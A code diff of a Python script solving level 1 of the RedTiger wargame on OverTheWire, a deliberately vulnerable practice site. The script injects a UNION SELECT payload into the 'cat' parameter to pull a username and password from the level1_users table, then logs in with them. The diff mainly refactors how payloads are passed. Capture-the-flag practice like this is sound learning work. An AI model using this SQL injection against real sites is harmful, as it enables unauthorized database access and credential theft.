@@ -4,6 +4,10 @@ import tigers as tg
 
 
 def main():
+    '''
+    Target: Get the login for the user Hornoxe 
+    Tablename: level1_users 
+    '''
     base_name = 'level1_users'
     url = "https://redtiger.labs.overthewire.org/level1.php"
     finds = ['username', 'password']  # What we are finding
@@ -15,10 +19,12 @@ def main():
     list_of_columns = [str(c + 1) for c in range(columns)]
 
     # Search for visible columns
-    list_of_visible, html_visible = tg.find_visible_columns(
-        url, len(list_of_columns),
-        f"-1 union select {','.join(list_of_columns)} from {base_name}",
-        'cat', '-1')
+    payload = dict(
+        cat=f"-1 union select {','.join(list_of_columns)} from {base_name}")
+    # Data for compare
+    p_base = dict(cat='-1')
+    list_of_visible, html_visible = tg.find_visible_columns(url, len(list_of_columns),
+                                                            payload, p_base)
 
     # Search for the desired data
     if len(finds) <= len(list_of_visible):
@@ -28,9 +34,10 @@ def main():
     else:
         print('too small visible list')
         exit(1)
-    keys = tg.find_param(url, len(finds), html_visible,
-                         f"-1 union select {','.join(list_of_columns)} from {base_name}",
-                         'cat')
+
+    payload = dict(
+        cat=f"-1 union select {','.join(list_of_columns)} from {base_name}")
+    keys = tg.find_param(url, len(finds), html_visible, payload)
 
     # Authorization
     data = dict(user=keys[0], password=keys[1], login='Login')
